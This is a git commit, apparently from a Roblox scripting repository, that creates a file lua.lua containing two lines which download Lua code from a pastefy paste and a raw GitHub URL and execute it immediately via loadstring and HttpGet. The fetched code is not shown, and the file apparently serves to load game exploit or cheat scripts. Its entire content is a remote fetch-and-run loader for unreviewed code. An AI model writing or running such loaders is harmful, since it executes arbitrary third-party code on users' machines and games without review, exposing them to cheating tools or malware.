9c6972b0781fcd667b32d9a773f59cb46e6457a5
sabs-script <scriptdark37@gmail.com>
2025-12-04 12:34:38 +0800

    Create lua.lua

---
+++ lua.lua
@@ -0,0 +1,3 @@
+loadstring(game:HttpGet("https://pastefy.app/8bDQ86Iu/raw", true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/admscript-lua/Ui.neildark/refs/heads/main/loading%20ui"))()
